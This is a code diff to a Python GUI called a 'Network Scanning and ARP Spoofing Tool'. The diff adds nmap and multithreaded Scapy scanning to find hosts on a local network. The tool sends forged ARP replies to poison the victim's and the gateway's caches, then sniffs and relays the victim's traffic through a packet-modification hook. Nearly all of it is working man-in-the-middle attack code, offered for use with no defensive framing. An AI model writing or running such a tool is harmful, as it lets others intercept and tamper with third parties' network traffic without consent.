@@ -1,17 +1,23 @@
 import os
 import socket
 import psutil
-from scapy.all import ARP, Ether, srp, send, sniff
+from scapy.all import ARP, Ether, srp, send, sniff, conf
 import tkinter as tk
 from tkinter import ttk
 import threading
 import platform
 import sys
+import nmap
+
+# Adjust Scapy timeout and retry settings for large networks
+conf.verb = 0  # Disable verbose output
+SCAN_TIMEOUT = 2  # Increase timeout
+SCAN_RETRIES = 3  # Number of retries
 
 class ARP_Spoof_GUI:
     def __init__(self, master):
         self.master = master
-        master.title("ARP Spoofing Tool")
+        master.title("Network Scanning and ARP Spoofing Tool")
         self.create_widgets()
         self.scan_thread = None
         self.attack_thread = None
@@ -26,7 +32,6 @@ class ARP_Spoof_GUI:
         self.create_buttons_frame()
         self.create_packet_text()
 
-    # Frame for selecting network interface and scanning network
     def create_scan_frame(self):
         self.frame_scan = ttk.Frame(self.master)
         self.frame_scan.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
@@ -37,7 +42,6 @@ class ARP_Spoof_GUI:
         self.scan_button = ttk.Button(self.frame_scan, text="Scan Network", command=self.scan_network)
         self.scan_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
 
-    # Frame for listing network devices
     def create_devices_frame(self):
         self.frame_devices = ttk.Frame(self.master)
         self.frame_devices.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)
@@ -47,7 +51,6 @@ class ARP_Spoof_GUI:
         self.devices_treeview.heading("MAC Address", text="MAC Address")
         self.devices_treeview.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)
 
-    # Frame for entering victim and gateway IP addresses
     def create_address_frame(self):
         self.frame_address = ttk.Frame(self.master)
         self.frame_address.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
@@ -60,7 +63,6 @@ class ARP_Spoof_GUI:
         self.entry_gateway_ip = ttk.Entry(self.frame_address)
         self.entry_gateway_ip.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
 
-    # Frame for control buttons (start/stop attack)
     def create_buttons_frame(self):
         self.frame_buttons = ttk.Frame(self.master)
         self.frame_buttons.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W)
@@ -70,19 +72,16 @@ class ARP_Spoof_GUI:
         self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
         self.stop_button.configure(state=tk.DISABLED)
 
-    # Text widget for displaying packet information
     def create_packet_text(self):
         self.packet_text = tk.Text(self.master, height=10, width=70)
         self.packet_text.grid(row=4, column=0, padx=10, pady=5, sticky=tk.W+tk.E)
 
-    # Set network interfaces for selection
     def set_network_interfaces(self):
         interfaces = self.get_network_interfaces()
         if interfaces:
             self.interfaces['values'] = list(interfaces)
             self.interfaces.set(list(interfaces)[0])
 
-    # Get network interfaces
     def get_network_interfaces(self):
         try:
             if platform.system() == 'Windows':
@@ -94,13 +93,11 @@ class ARP_Spoof_GUI:
             print(f"Error getting network interfaces: {e}")
             return None
 
-    # Scan the network for devices
     def scan_network(self):
         selected_network = self.interfaces.get()
         self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
         self.scan_thread.start()
 
-    # Perform network scan using Scapy
     def do_scan_network(self, selected_network):
         ip_range = self.get_ip_range(selected_network)
         if not ip_range:
@@ -108,15 +105,30 @@ class ARP_Spoof_GUI:
             return
 
         self.insert_to_treeview(f"Scanning network: {ip_range}...")
-        devices = self.scan_with_scapy(ip_range)
 
+        # Use Scapy for scanning
+        devices = self.scan_with_scapy(ip_range)
         unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
         devices = list(unique_devices.values())
 
         for device in devices:
             self.insert_to_treeview(device['ip'], device['mac'])
 
-    # Get IP range based on selected network interface
+        # Use nmap for scanning
+        nm = nmap.PortScanner()
+        try:
+            nm.scan(hosts=ip_range, arguments='-sP')
+            self.parse_nmap_output(nm)
+        except Exception as e:
+            self.insert_to_treeview("Error scanning network with nmap: " + str(e))
+
+    def parse_nmap_output(self, nm):
+        for host in nm.all_hosts():
+            if 'mac' in nm[host]['addresses']:
+                self.insert_to_treeview(nm[host]['addresses']['ipv4'], nm[host]['addresses']['mac'])
+            else:
+                self.insert_to_treeview(nm[host]['addresses']['ipv4'])
+
     def get_ip_range(self, interface):
         ip_address = self.get_ip_address(interface)
         netmask = self.get_netmask(interface)
@@ -124,7 +136,6 @@ class ARP_Spoof_GUI:
             return self.ip_to_cidr(ip_address, netmask)
         return None
 
-    # Get IP address for a given network interface
     def get_ip_address(self, ifname):
         addrs = psutil.net_if_addrs().get(ifname, [])
         for addr in addrs:
@@ -132,7 +143,6 @@ class ARP_Spoof_GUI:
                 return addr.address
         return None
 
-    # Get netmask for a given network interface
     def get_netmask(self, ifname):
         addrs = psutil.net_if_addrs().get(ifname, [])
         for addr in addrs:
@@ -140,34 +150,56 @@ class ARP_Spoof_GUI:
                 return addr.netmask
         return None
 
-    # Convert IP address and netmask to CIDR notation
     def ip_to_cidr(self, ip, netmask):
         ip_bits = "".join([bin(int(x))[2:].zfill(8) for x in ip.split(".")])
         netmask_bits = "".join([bin(int(x))[2:].zfill(8) for x in netmask.split(".")])
         cidr = sum([1 for bit in netmask_bits if bit == '1'])
         return f"{ip}/{cidr}"
 
-    # Scan the network using Scapy
     def scan_with_scapy(self, ip_range):
-        arp = ARP(pdst=ip_range)
-        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-        packet = ether / arp
+        ip_chunks = self.divide_ip_range(ip_range)
+        results = []
+        threads = []
+        for chunk in ip_chunks:
+            thread = threading.Thread(target=self.scan_chunk, args=(chunk, results))
+            thread.start()
+            threads.append(thread)
 
-        result = srp(packet, timeout=5, verbose=False)[0]
-        devices = []
-        for sent, received in result:
-            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
+        for thread in threads:
+            thread.join()
 
-        return devices
+        return results
 
-    # Insert scanned devices into the Treeview
+    def scan_chunk(self, ip_chunk, results):
+        try:
+            arp = ARP(pdst=ip_chunk)
+            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+            packet = ether / arp
+            result = srp(packet, timeout=SCAN_TIMEOUT, retry=SCAN_RETRIES, verbose=False)[0]
+            for sent, received in result:
+                results.append({'ip': received.psrc, 'mac': received.hwsrc})
+        except Exception as e:
+            print(f"Error scanning chunk {ip_chunk}: {e}")
+
+    def divide_ip_range(self, ip_range):
+        ip, prefix_length = ip_range.split('/')
+        prefix_length = int(prefix_length)
+        base_ip = '.'.join(ip.split('.')[:3])
+        num_chunks = 256
+        chunk_size = 2**(32 - prefix_length) // num_chunks
+        chunks = []
+        for i in range(num_chunks):
+            start_ip = f"{base_ip}.{i * chunk_size}"
+            end_ip = f"{base_ip}.{(i + 1) * chunk_size - 1}"
+            chunks.append(f"{start_ip}-{end_ip}")
+        return chunks
+
     def insert_to_treeview(self, ip, mac=None):
         if mac:
             self.devices_treeview.insert("", tk.END, text="Device", values=(ip, mac))
         else:
             self.devices_treeview.insert("", tk.END, text="Info", values=(ip, ""))
 
-    # Start ARP spoofing attack
     def start_attack(self):
         self.attack_button.configure(state=tk.DISABLED)
         self.stop_button.configure(state=tk.NORMAL)
@@ -179,7 +211,6 @@ class ARP_Spoof_GUI:
         self.sniff_thread = threading.Thread(target=self.start_sniffing, args=(victim_ip,))
         self.sniff_thread.start()
 
-    # Perform ARP spoofing
     def do_start_attack(self, gateway_ip, victim_ip):
         self.attacker_mac = self.get_attacker_mac()
         victim_mac = None
@@ -208,17 +239,14 @@ class ARP_Spoof_GUI:
             self.attack_button.configure(state=tk.NORMAL)
             self.stop_button.configure(state=tk.DISABLED)
 
-    # Send ARP spoofing packets
     def arp_spoof(self, target_ip, target_mac, spoof_ip):
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=self.attacker_mac)
         send(packet, verbose=False)
 
-    # Restore original ARP entries
     def restore_arp(self, target_ip, target_mac, source_ip, source_mac):
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
         send(packet, verbose=False)
 
-    # Start sniffing packets
     def start_sniffing(self, victim_ip):
         self.victim_mac = None
         devices = self.scan_with_scapy(self.get_ip_range(self.interfaces.get()))
@@ -244,7 +272,6 @@ class ARP_Spoof_GUI:
 
         sniff(filter=f"host {victim_ip}", prn=self.handle_packet)
 
-    # Handle sniffed packets
     def handle_packet(self, packet):
         if packet.haslayer(IP):
             if packet.src == self.victim_mac and packet.dst == self.attacker_mac:
@@ -256,16 +283,13 @@ class ARP_Spoof_GUI:
                 send(modified_packet, verbose=False)
                 self.insert_to_packet_text(f"Forwarded to Victim: {packet.summary()}\n")
 
-    # Modify packets if needed
     def modify_packet(self, packet):
         return packet
 
-    # Insert packet information into text widget
     def insert_to_packet_text(self, text):
         self.packet_text.insert(tk.END, text)
         self.packet_text.see(tk.END)
 
-    # Get attacker's MAC address
     def get_attacker_mac(self):
         addrs = psutil.net_if_addrs().get(self.interfaces.get(), [])
         for addr in addrs:
@@ -273,7 +297,6 @@ class ARP_Spoof_GUI:
                 return addr.address
         return None
 
-    # Stop ARP spoofing attack
     def stop_attack(self):
         self.attack_button.configure(state=tk.NORMAL)
         self.stop_button.configure(state=tk.DISABLED)
